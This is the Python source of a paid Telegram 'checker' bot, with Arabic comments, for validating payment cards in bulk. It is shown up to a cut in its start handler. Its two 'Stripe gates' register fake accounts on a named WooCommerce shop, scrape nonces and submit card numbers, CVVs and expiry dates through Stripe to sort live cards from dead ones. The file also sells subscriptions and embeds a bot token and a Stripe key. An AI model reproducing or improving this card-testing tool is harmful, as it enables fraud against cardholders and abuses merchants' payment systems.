# ==================== التحقق من إصدار Python ====================
import sys
import platform

print(f"📌 إصدار Python: {sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}")
print(f"📌 نظام التشغيل: {platform.system()} {platform.release()}")

# ==================== المكتبات المطلوبة ====================
import time
import json
import random
import string
import re
import base64
import os
import uuid
import threading
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse
import http.server
import socketserver
import shutil
import tempfile

# استيراد المكتبات الخارجية
try:
    import requests
    import aiohttp
    from fake_useragent import UserAgent
    from faker import Faker
    from colorama import init, Fore, Style
    import telebot
    from telebot import types
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
except ImportError as e:
    print(f"❌ خطأ في استيراد المكتبات: {e}")
    sys.exit(1)

# تهيئة الألوان
init(autoreset=True)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8375573526:AAFa882xWsLWl6LAfl0IcaZEU12hyP6YIy0"
ADMIN_IDS = [6207431030]
CHANNEL_USERNAME = "@ObeidaOnline"
DEV_CONTACT = "@Sz2zv"
BOT_USERNAME = "@farah_obeida_bot"

CHANNEL_LINK = "@ObeidaOnline"
SUPPORT_LINK = "@Sz2zv"

# مجلدات التخزين
DATA_FOLDER = "data"
BACKUP_FOLDER = "backups"
TEMP_FOLDER = "temp"

# إنشاء المجلدات تلقائياً
os.makedirs(DATA_FOLDER, exist_ok=True)
os.makedirs(BACKUP_FOLDER, exist_ok=True)
os.makedirs(TEMP_FOLDER, exist_ok=True)

# ملفات التخزين (داخل مجلد data)
USERS_FILE = os.path.join(DATA_FOLDER, "users.json")
APPROVED_CARDS_FILE = os.path.join(DATA_FOLDER, "approved.txt")
DECLINED_CARDS_FILE = os.path.join(DATA_FOLDER, "declined.txt")
STATS_FILE = os.path.join(DATA_FOLDER, "stats.json")
SETTINGS_FILE = os.path.join(DATA_FOLDER, "settings.json")
GROUPS_FILE = os.path.join(DATA_FOLDER, "groups.json")

# ==================== إعدادات البوابات ====================
GATES = {
    "stripe1": {
        "name": "💳 Stripe Auth v1",
        "description": "فحص بطاقات عبر بوابة Stripe الأولى",
        "command": "st1",
        "mass_command": "st1m",
        "enabled": True,
        "timeout": 30,
        "icon": "💳",
        "default": True
    },
    "stripe2": {
        "name": "💎 Stripe Auth v2",
        "description": "فحص بطاقات عبر بوابة Stripe الثانية",
        "command": "st2",
        "mass_command": "st2m",
        "enabled": True,
        "timeout": 30,
        "icon": "💎",
        "default": False
    }
}

# ==================== نظام الاشتراكات ====================
SUBSCRIPTION_PLANS = {
    "day": {"name": "يومي", "price": "5K ID", "duration": 1},
    "week": {"name": "أسبوعي", "price": "15K ID", "duration": 7},
    "month": {"name": "شهري", "price": "40K ID", "duration": 30},
    "3months": {"name": "3 أشهر", "price": "100K ID", "duration": 90},
    "6months": {"name": "6 أشهر", "price": "180K ID", "duration": 180},
    "year": {"name": "سنوي", "price": "300K ID", "duration": 365}
}

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
fake = Faker()
ua = UserAgent()

# متغيرات عامة
active_checks = {}
user_sessions = {}
live_stats = {}
user_current_gate = {}
user_last_file = {}  # تخزين آخر ملف أرسله كل مستخدم {user_id: {"file_id": xxx, "file_name": xxx, "content": xxx}}
group_settings = {}  # إعدادات المجموعات

# ==================== إدارة البيانات التلقائية ====================
class DataManager:
    
    @staticmethod
    def init_files():
        """تهيئة جميع الملفات تلقائياً"""
        if not os.path.exists(USERS_FILE):
            users = {}
            for admin_id in ADMIN_IDS:
                users[str(admin_id)] = {
                    "user_id": admin_id,
                    "username": "admin",
                    "first_name": "Admin",
                    "joined_date": datetime.now().isoformat(),
                    "is_admin": True,
                    "is_subscribed": True,
                    "subscription": {"plan": "lifetime", "expiry": "2099-12-31", "active": True},
                    "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                    "default_gate": "stripe1"
                }
            DataManager.save_json(USERS_FILE, users)
        
        if not os.path.exists(STATS_FILE):
            DataManager.save_json(STATS_FILE, {
                "total_checks": 0,
                "total_approved": 0,
                "total_declined": 0,
                "gates_usage": {},
                "daily_stats": {},
                "last_backup": None
            })
        
        if not os.path.exists(SETTINGS_FILE):
            DataManager.save_json(SETTINGS_FILE, {
                "auto_backup": True,
                "backup_interval_hours": 24,
                "auto_clean": True,
                "clean_days": 30,
                "maintenance_mode": False,
                "maintenance_message": "البوت تحت الصيانة حالياً",
                "default_check_gate": "stripe1",
                "group_mode": True,  # تفعيل العمل في المجموعات
                "require_sub_in_groups": True  # هل يتطلب اشتراك في المجموعات
            })
        
        if not os.path.exists(GROUPS_FILE):
            DataManager.save_json(GROUPS_FILE, {
                "allowed_groups": [],  # المجموعات المسموح لها باستخدام البوت
                "blocked_groups": [],  # المجموعات المحظورة
                "group_settings": {}   # إعدادات لكل مجموعة
            })
        
        for file in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if not os.path.exists(file):
                with open(file, 'w', encoding='utf-8') as f:
                    f.write(f"# {'Approved' if 'approved' in file else 'Declined'} Cards\n")
                    f.write(f"# Created: {datetime.now()}\n")
    
    @staticmethod
    def load_json(file_path: str, default: Any = None) -> Any:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return default if default is not None else {}
        except Exception:
            return default if default is not None else {}
    
    @staticmethod
    def save_json(file_path: str, data: Any) -> bool:
        try:
            if os.path.exists(file_path) and file_path.endswith('.json'):
                backup_path = os.path.join(BACKUP_FOLDER, f"{os.path.basename(file_path)}.{int(time.time())}.bak")
                shutil.copy2(file_path, backup_path)
            
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"❌ خطأ في حفظ {file_path}: {e}")
            return False
    
    @staticmethod
    def load_users() -> Dict:
        DataManager.init_files()
        users = DataManager.load_json(USERS_FILE, {})
        
        for uid, user in users.items():
            if "usage" not in user:
                user["usage"] = {"total_checks": 0, "approved": 0, "declined": 0}
            if "subscription" not in user:
                user["subscription"] = {"active": False}
            if "default_gate" not in user:
                user["default_gate"] = "stripe1"
        
        return users
    
    @staticmethod
    def save_users(users: Dict) -> bool:
        return DataManager.save_json(USERS_FILE, users)
    
    @staticmethod
    def load_stats() -> Dict:
        DataManager.init_files()
        stats = DataManager.load_json(STATS_FILE, {
            "total_checks": 0,
            "total_approved": 0,
            "total_declined": 0,
            "gates_usage": {},
            "daily_stats": {}
        })
        
        defaults = {
            "total_checks": 0,
            "total_approved": 0,
            "total_declined": 0,
            "gates_usage": {},
            "daily_stats": {},
            "last_backup": None
        }
        
        for key, value in defaults.items():
            if key not in stats:
                stats[key] = value
        
        return stats
    
    @staticmethod
    def save_stats(stats: Dict) -> bool:
        return DataManager.save_json(STATS_FILE, stats)
    
    @staticmethod
    def load_settings() -> Dict:
        return DataManager.load_json(SETTINGS_FILE, {
            "auto_backup": True,
            "backup_interval_hours": 24,
            "auto_clean": True,
            "clean_days": 30,
            "maintenance_mode": False,
            "default_check_gate": "stripe1",
            "group_mode": True,
            "require_sub_in_groups": True
        })
    
    @staticmethod
    def save_settings(settings: Dict) -> bool:
        return DataManager.save_json(SETTINGS_FILE, settings)
    
    @staticmethod
    def load_groups() -> Dict:
        return DataManager.load_json(GROUPS_FILE, {
            "allowed_groups": [],
            "blocked_groups": [],
            "group_settings": {}
        })
    
    @staticmethod
    def save_groups(groups: Dict) -> bool:
        return DataManager.save_json(GROUPS_FILE, groups)
    
    @staticmethod
    def save_card_result(card: str, gate: str, response: str, user_id: int, is_approved: bool):
        try:
            file_path = APPROVED_CARDS_FILE if is_approved else DECLINED_CARDS_FILE
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {gate} | User:{user_id} | {card} | {response}\n")
        except:
            pass
    
    @staticmethod
    def get_user_subscription(user_id: int) -> Optional[Dict]:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        sub = user.get("subscription", {})
        if sub.get("active"):
            expiry = sub.get("expiry")
            if expiry and expiry != "2099-12-31":
                try:
                    expiry_date = datetime.fromisoformat(expiry)
                    if expiry_date < datetime.now():
                        sub["active"] = False
                        DataManager.save_users(users)
                        return None
                except:
                    pass
            return sub
        return None
    
    @staticmethod
    def check_access(user_id: int, chat_id: int = None) -> bool:
        """التحقق من صلاحية المستخدم مع مراعاة المجموعات"""
        # المشرفين دائماً مسموح لهم
        if user_id in ADMIN_IDS:
            return True
        
        settings = DataManager.load_settings()
        if settings.get("maintenance_mode", False):
            return False
        
        # إذا كان في مجموعة
        if chat_id and chat_id < 0:  # chat_id سالب يعني مجموعة
            groups = DataManager.load_groups()
            
            # التحقق إذا كانت المجموعة محظورة
            if chat_id in groups.get("blocked_groups", []):
                return False
            
            # التحقق إذا كانت المجموعة مسموحة (إذا تم تعيين قائمة مسموحة)
            allowed = groups.get("allowed_groups", [])
            if allowed and chat_id not in allowed:
                return False
            
            # التحقق من إعدادات المجموعة
            group_set = groups.get("group_settings", {}).get(str(chat_id), {})
            if group_set.get("disabled", False):
                return False
            
            # إذا كان يتطلب اشتراك في المجموعات
            if settings.get("require_sub_in_groups", True):
                return DataManager.get_user_subscription(user_id) is not None
            else:
                return True
        
        # في الخاص
        return DataManager.get_user_subscription(user_id) is not None
    
    @staticmethod
    def get_user_default_gate(user_id: int) -> str:
        users = DataManager.load_users()
        user = users.get(str(user_id), {})
        return user.get("default_gate", "stripe1")
    
    @staticmethod
    def set_user_default_gate(user_id: int, gate: str) -> bool:
        if gate not in GATES:
            return False
        users = DataManager.load_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        users[uid]["default_gate"] = gate
        return DataManager.save_users(users)
    
    @staticmethod
    def add_subscription(user_id: int, days: int) -> bool:
        users = DataManager.load_users()
        uid = str(user_id)
        
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        
        expiry = datetime.now() + timedelta(days=days)
        
        plan_name = "مخصص"
        for plan_key, plan in SUBSCRIPTION_PLANS.items():
            if plan["duration"] == days:
                plan_name = plan["name"]
                break
        
        users[uid]["subscription"] = {
            "plan": plan_name,
            "expiry": expiry.isoformat(),
            "active": True,
            "added_by": "admin",
            "added_date": datetime.now().isoformat(),
            "duration_days": days
        }
        
        return DataManager.save_users(users)
    
    @staticmethod
    def remove_subscription(user_id: int) -> bool:
        users = DataManager.load_users()
        if str(user_id) in users:
            users[str(user_id)]["subscription"] = {"active": False}
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def update_usage(user_id: int, gate: str, result: str):
        users = DataManager.load_users()
        stats = DataManager.load_stats()
        
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "user_id": user_id,
                "joined_date": datetime.now().isoformat(),
                "usage": {"total_checks": 0, "approved": 0, "declined": 0}
            }
        
        is_approved = any(x in result for x in ["✅", "LIVE", "Approved", "approved", "UwU"])
        
        usage = users[uid].get("usage", {"total_checks": 0, "approved": 0, "declined": 0})
        usage["total_checks"] += 1
        
        if is_approved:
            usage["approved"] += 1
            stats["total_approved"] = stats.get("total_approved", 0) + 1
        else:
            usage["declined"] += 1
            stats["total_declined"] = stats.get("total_declined", 0) + 1
        
        users[uid]["usage"] = usage
        
        stats["total_checks"] = stats.get("total_checks", 0) + 1
        stats["gates_usage"][gate] = stats["gates_usage"].get(gate, 0) + 1
        
        today = datetime.now().strftime("%Y-%m-%d")
        if today not in stats["daily_stats"]:
            stats["daily_stats"][today] = {"checks": 0, "approved": 0}
        stats["daily_stats"][today]["checks"] += 1
        if is_approved:
            stats["daily_stats"][today]["approved"] += 1
        
        DataManager.save_users(users)
        DataManager.save_stats(stats)
    
    @staticmethod
    def auto_backup():
        settings = DataManager.load_settings()
        if not settings.get("auto_backup", True):
            return
        
        stats = DataManager.load_stats()
        last_backup = stats.get("last_backup")
        
        if last_backup:
            try:
                last_time = datetime.fromisoformat(last_backup)
                hours_passed = (datetime.now() - last_time).total_seconds() / 3600
                if hours_passed < settings.get("backup_interval_hours", 24):
                    return
            except:
                pass
        
        backup_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        backup_dir = os.path.join(BACKUP_FOLDER, backup_name)
        os.makedirs(backup_dir, exist_ok=True)
        
        for file in os.listdir(DATA_FOLDER):
            src = os.path.join(DATA_FOLDER, file)
            if os.path.isfile(src):
                dst = os.path.join(backup_dir, file)
                shutil.copy2(src, dst)
        
        stats["last_backup"] = datetime.now().isoformat()
        DataManager.save_stats(stats)
        
        backups = sorted([d for d in os.listdir(BACKUP_FOLDER) if d.startswith("backup_")])
        if len(backups) > 10:
            for old_backup in backups[:-10]:
                shutil.rmtree(os.path.join(BACKUP_FOLDER, old_backup))
        
        print(f"✅ تم عمل نسخة احتياطية: {backup_name}")
    
    @staticmethod
    def auto_clean():
        settings = DataManager.load_settings()
        if not settings.get("auto_clean", True):
            return
        
        clean_days = settings.get("clean_days", 30)
        cutoff = datetime.now() - timedelta(days=clean_days)
        
        for file_path in [APPROVED_CARDS_FILE, DECLINED_CARDS_FILE]:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                
                new_lines = []
                for line in lines:
                    if line.startswith('#'):
                        new_lines.append(line)
                    else:
                        try:
                            date_str = line.split(']')[0].strip('[')
                            line_date = datetime.strptime(date_str, '%Y-%m-%d %H:%M:%S')
                            if line_date > cutoff:
                                new_lines.append(line)
                        except:
                            new_lines.append(line)
                
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.writelines(new_lines)
        
        print(f"✅ تم التنظيف التلقائي للبيانات الأقدم من {clean_days} يوم")

# ==================== أدوات مساعدة ====================
class Helpers:
    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        try:
            card_str = re.sub(r'[;:,\s/]+', '|', card_str.strip())
            if '|' in card_str:
                parts = card_str.split('|')
                if len(parts) >= 4:
                    number = re.sub(r'\D', '', parts[0])
                    month = re.sub(r'\D', '', parts[1])
                    year = re.sub(r'\D', '', parts[2])
                    cvv = re.sub(r'\D', '', parts[3])
                    
                    if len(number) >= 15 and len(number) <= 19:
                        if len(month) == 1: month = f"0{month}"
                        if len(year) == 4: year = year[-2:]
                        if len(cvv) >= 3 and len(cvv) <= 4:
                            return {'number': number, 'month': month, 'year': year, 'cvv': cvv, 'original': card_str}
            return None
        except:
            return None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[Dict]:
        """استخراج جميع البطاقات من النص"""
        cards = []
        lines = text.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line and not line.startswith('#'):
                card = Helpers.parse_card(line)
                if card and Helpers.luhn_check(card['number']):
                    cards.append(card)
        return cards
    
    @staticmethod
    def generate_progress_bar(current: int, total: int, length: int = 10) -> str:
        if total == 0: return "⬜" * length
        filled = int((current / total) * length)
        return "🟩" * filled + "⬜" * (length - filled)
    
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        try:
            digits = [int(d) for d in card_number if d.isdigit()]
            if len(digits) < 13: return False
            checksum = 0
            for i, digit in enumerate(reversed(digits)):
                if i % 2 == 1:
                    digit *= 2
                    if digit > 9: digit -= 9
                checksum += digit
            return checksum % 10 == 0
        except:
            return False
    
    @staticmethod
    def get_card_brand(number: str) -> str:
        patterns = {
            'visa': r'^4', 'mastercard': r'^5[1-5]', 'amex': r'^3[47]',
            'discover': r'^6(?:011|5)', 'jcb': r'^(?:2131|1800|35)'
        }
        for brand, pattern in patterns.items():
            if re.match(pattern, number):
                return brand.capitalize()
        return "Unknown"
    
    @staticmethod
    def get_bin_info(bin_num: str) -> Dict:
        try:
            r = requests.get(f"https://lookup.binlist.net/{bin_num[:6]}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                return {
                    "brand": data.get('scheme', 'Unknown').upper(),
                    "type": data.get('type', 'Unknown').upper(),
                    "bank": data.get('bank', {}).get('name', 'Unknown'),
                    "country": data.get('country', {}).get('name', 'Unknown'),
                    "flag": data.get('country', {}).get('emoji', '🏁')
                }
        except:
            pass
        return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown", "flag": "🏁"}
    
    @staticmethod
    def format_live_stats(total: int, checked: int, approved: int, declined: int, current: str = None) -> str:
        progress = Helpers.generate_progress_bar(checked, total)
        percentage = (checked / total * 100) if total > 0 else 0
        stats = f"📊 {checked}/{total} ({percentage:.1f}%)\n{progress}\n✅ {approved} | ❌ {declined} | ⏳ {total - checked}"
        if current: stats += f"\n🔄 {current}"
        return stats
    
    @staticmethod
    def get_chat_type(chat_id: int) -> str:
        """تحديد نوع المحادثة"""
        if chat_id > 0:
            return "private"
        else:
            return "group"

# ==================== بوابة Stripe 1 ====================
class StripeGateway1:
    @staticmethod
    def normalize_url(url):
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        url = url.rstrip('/')
        if '/my-account' not in url.lower():
            url += '/my-account'
        if not url.endswith('/'):
            url += '/'
        return url
    
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
        number = random.randint(100, 9999)
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
        return f"{username}{number}@{random.choice(domains)}"
    
    @staticmethod
    def generate_guid():
        return str(uuid.uuid4())
    
    @staticmethod
    def gets(s, start, end):
        try:
            start_index = s.index(start) + len(start)
            end_index = s.index(end, start_index)
            return s[start_index:end_index]
        except (ValueError, AttributeError):
            return None
    
    @staticmethod
    async def process_card(site_url: str, card_data: Dict) -> Tuple[bool, str]:
        try:
            site_url = StripeGateway1.normalize_url(site_url or "https://copenhagensilver.com")
            timeout = aiohttp.ClientTimeout(total=70)
            connector = aiohttp.TCPConnector(ssl=False)
            
            async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
                parsed = urlparse(site_url)
                domain = f"{parsed.scheme}://{parsed.netloc}"
                email = StripeGateway1.generate_random_email()
                
                headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9', 'user-agent': ua.random}
                resp = await session.get(site_url, headers=headers)
                resp_text = await resp.text()
                
                register_nonce = (StripeGateway1.gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                                 StripeGateway1.gets(resp_text, 'id="woocommerce-register-nonce" value="', '"'))
                
                if register_nonce:
                    password = f"Pass{random.randint(100000, 999999)}!"
                    register_data = {
                        'email': email, 'password': password,
                        'woocommerce-register-nonce': register_nonce,
                        'register': 'Register'
                    }
                    await session.post(site_url, headers=headers, data=register_data)
                
                add_payment_url = f"{domain}/my-account/add-payment-method/"
                resp = await session.get(add_payment_url, headers={'user-agent': ua.random})
                payment_page_text = await resp.text()
                
                add_card_nonce = (StripeGateway1.gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                                 StripeGateway1.gets(payment_page_text, 'add_card_nonce":"', '"'))
                
                stripe_key = (StripeGateway1.gets(payment_page_text, '"key":"pk_', '"') or 
                             StripeGateway1.gets(payment_page_text, 'data-key="pk_', '"'))
                
                if not stripe_key:
                    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                    if pk_match: stripe_key = pk_match.group(0)
                if not stripe_key:
                    stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
                
                stripe_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua.random
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_data['number'],
                    'card[cvc]': card_data['cvv'],
                    'card[exp_month]': card_data['month'],
                    'card[exp_year]': card_data['year'],
                    'key': stripe_key,
                    '_stripe_version': '2024-06-20'
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                if 'error' in pm_json:
                    return False, pm_json['error']['message']
                
                pm_id = pm_json.get('id')
                if not pm_id:
                    return False, "Failed to create Payment Method"
                
                confirm_headers = {
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': ua.random
                }
                
                if add_card_nonce:
                    confirm_data = {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        '_ajax_nonce': add_card_nonce
                    }
                    confirm_resp = await session.post(f"{domain}/wp-admin/admin-ajax.php", data=confirm_data, headers=confirm_headers)
                    try:
                        result = await confirm_resp.json()
                        if result.get('success'):
                            return True, "✅ Card Approved"
                    except:
                        pass
                
                return False, "❌ Declined"
                
        except Exception as e:
            return False, f"⚠️ Error: {str(e)[:50]}"

# ==================== بوابة Stripe 2 ====================
class StripeGateway2:
    @staticmethod
    def generate_random_email():
        username = ''.join(random.choices(string.ascii_lowercase, k=10))
        return f"{username}@gmail.com"
    
    @staticmethod
    def generate_random_password(length: int = 12):
        characters = string.ascii_letters + string.digits + "!@#$%^&*()"
        return ''.join(random.choices(characters, k=length))
    
    async def process_card(self, card_data: Dict) -> Tuple[bool, str]:
        try:
            site_url = "https://copenhagensilver.com"
            
            async with aiohttp.ClientSession() as session:
                headers = {
                    'referer': f'{site_url}/my-account/',
                    'accept': 'text/html,application/xhtml+xml',
                    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36'
                }
                
                resp = await session.get(f"{site_url}/my-account/", headers=headers)
                html = await resp.text()
                
                register_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
                if not register_match:
                    return False, "❌ Failed to extract register nonce"
                
                register_nonce = register_match.group(1)
                email = self.generate_random_email()
                password = self.generate_random_password()
                
                headers['content-type'] = 'application/x-www-form-urlencoded'
                register_data = {
                    'email': email, 'password': password,
                    'woocommerce-register-nonce': register_nonce,
                    'register': 'Register'
                }
                
                await session.post(f"{site_url}/my-account/", headers=headers, data=register_data)
                
                resp = await session.get(f"{site_url}/my-account/add-payment-method/", headers=headers)
                data = await resp.text()
                
                nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', data)
                stripe_pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', data)
                
                if not nonce_match or not stripe_pk_match:
                    return False, "❌ SetupIntent nonce not found"
                
                nonce = nonce_match.group(1)
                pk = stripe_pk_match.group(0)
                
                stripe_headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': headers['user-agent']
                }
                
                stripe_data = {
                    "type": "card",
                    "card[number]": card_data['number'],
                    "card[cvc]": card_data['cvv'],
                    "card[exp_year]": card_data['year'][-2:],
                    "card[exp_month]": card_data['month'],
                    "key": pk,
                    "_stripe_version": "2024-06-20"
                }
                
                pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
                pm_json = await pm_resp.json()
                
                token = pm_json.get("id")
                if not token:
                    return False, "❌ Invalid card"
                
                confirm_headers = {
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': headers['user-agent']
                }
                
                confirm_data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': token,
                    '_ajax_nonce': nonce,
                }
                
                confirm_resp = await session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=confirm_headers, data=confirm_data)
                
                try:
                    result = await confirm_resp.json()
                    if result.get('success'):
                        return True, "✅ Card Approved"
                    else:
                        error_msg = result.get('data', {}).get('error', {}).get('message', 'Declined')
                        return False, f"❌ {error_msg}"
                except:
                    return False, "❌ Unexpected response"
                    
        except Exception as e:
            return False, f"⚠️ Error: {str(e)[:50]}"

# ==================== بوابات الفحص ====================
class RealGateways:
    def __init__(self):
        self.gateway1 = StripeGateway1()
        self.gateway2 = StripeGateway2()
    
    async def check_card(self, gate: str, card: Dict, site_url: str = None) -> Tuple[bool, str]:
        if gate == 'stripe1':
            return await self.gateway1.process_card(site_url, card)
        elif gate == 'stripe2':
            return await self.gateway2.process_card(card)
        else:
            return False, "❌ بوابة غير مدعومة"

# ==================== واجهة المستخدم ====================
class UserInterface:
    @staticmethod
    def main_menu(chat_type: str = "private"):
        markup = InlineKeyboardMarkup(row_width=2)
        
        if chat_type == "private":
            btns = [
                InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
                InlineKeyboardButton("📁 فحص ملف", callback_data="mass_check"),
                InlineKeyboardButton("⚙️ البوابة الافتراضية", callback_data="default_gate"),
                InlineKeyboardButton("👤 حسابي", callback_data="my_profile"),
                InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                InlineKeyboardButton("💎 الاشتراك", callback_data="subscribe"),
                InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
                InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
            ]
        else:
            btns = [
                InlineKeyboardButton("💳 Stripe v1", callback_data="gate_stripe1"),
                InlineKeyboardButton("💎 Stripe v2", callback_data="gate_stripe2"),
                InlineKeyboardButton("📁 فحص آخر ملف", callback_data="check_last_file"),
                InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
                InlineKeyboardButton("👨‍💻 المطور", url=SUPPORT_LINK)
            ]
        
        markup.add(*btns)
        return markup
    
    @staticmethod
    def default_gate_menu(current_gate: str):
        markup = InlineKeyboardMarkup(row_width=2)
        for gate_id, gate in GATES.items():
            status = "✅ " if gate_id == current_gate else ""
            markup.add(InlineKeyboardButton(f"{status}{gate['icon']} {gate['name']}", callback_data=f"set_default_{gate_id}"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_main"))
        return markup
    
    @staticmethod
    def back_button(callback="back_main"):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data=callback))
        return markup
    
    @staticmethod
    def stop_button(check_id: int):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⛔ إيقاف الفحص", callback_data=f"stop_{check_id}"))
        return markup
    
    @staticmethod
    def format_result(card: str, result: str, gate: str, is_approved: bool) -> str:
        status = "✅" if is_approved else "❌"
        number = card.split('|')[0] if '|' in card else card
        masked = f"{number[:6]}xxxxxx{number[-4:]}"
        brand = Helpers.get_card_brand(number)
        bin_info = Helpers.get_bin_info(number[:6])
        return f"""
{status} <b>نتيجة الفحص</b>
━━━━━━━━━━━━
<b>💳 البطاقة:</b> <code>{masked}</code>
<b>🏷️ النوع:</b> {brand} | {bin_info['brand']}
<b>🏦 البنك:</b> {bin_info['bank']}
<b>🌍 الدولة:</b> {bin_info['country']} {bin_info['flag']}
<b>🚪 البوابة:</b> {gate}
━━━━━━━━━━━━
<b>🆔 Obeida Online</b> | <a href='{CHANNEL_LINK}'>انقرهنا</a>
"""

# ==================== معالج الأوامر ====================
class CommandHandler:
    def __init__(self):
        self.gateways = RealGateways()
        self.ui = UserInterface()
        self.active_checks = active_checks
        self.live_stats = live_stats
        self.user_last_file = user_last_file
        self.start_auto_tasks()
    
    def start_auto_tasks(self):
        def auto_tasks():
            while True:
                try:
                    DataManager.auto_backup()
                    DataManager.auto_clean()
                except Exception as e:
                    print(f"⚠️ خطأ في المهام التلقائية: {e}")
                time.sleep(3600)
        
        thread = threading.Thread(target=auto_tasks, daemon=True)
        thread.start()
    
    def check_sub(self, message) -> bool:
        """التحقق من صلاحية المستخدم مع مراعاة المجموعات"""
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        settings = DataManager.load_settings()
        if settings.get("maintenance_mode", False):
            bot.reply_to(message, f"🔧 {settings.get('maintenance_message', 'البوت تحت الصيانة')}")
            return False
        
        return DataManager.check_access(user_id, chat_id)
    
    def handle_start(self, message):
        user = message.from_user
        chat_id = message.chat.id
        chat_type = Helpers.get_chat_type(chat_id)
        
        users = DataManager.load_users()
        uid = str(user.id)
        
        if uid not in users:
            users[uid] = {
                "user_id": user.id,
                "username": user.username,
                "first_name": user.first_name,
                "joined_date": datetime.now().isoformat(),
                "is_admin": user.id in ADMIN_IDS,
                "usage": {"total_checks": 0, "approved": 0, "declined": 0},
                "default_gate": "stripe1"
            }
            DataManager.save_users(users)
        
        default_gate = DataManager.get_user_default_gate(user.id)
        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe v1")
        
        if chat_type == "private":
            welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
<b>💡 يمكنك إرسال البطاقة مباشرة وسيتم فحصها تلقائياً!</b>

<b>📝 الطرق المتاحة:</b>
• أرسل ملف txt وسيتم فحص جميع البطاقات
• استخدم /st1 أو /st2 لاختيار بوابة معينة

<b>📢 القناة:</b> {CHANNEL_USERNAME}
<b>👨‍💻 المطور:</b> {DEV_CONTACT}
"""
        else:
            welcome = f"""
✨ <b>مرحباً بك في بوت Obeida Online</b> ✨

<b>🚪 البوابة الافتراضية:</b> {default_gate_name}

<b>📝 كيفية الاستخدام في المجموعة:</b>
• أرسل البطاقة مباشرة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>
• أرسل ملف txt مع منشن البوت
• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot

<b>📢 القناة:</b> {CHANNEL_USERNAME}
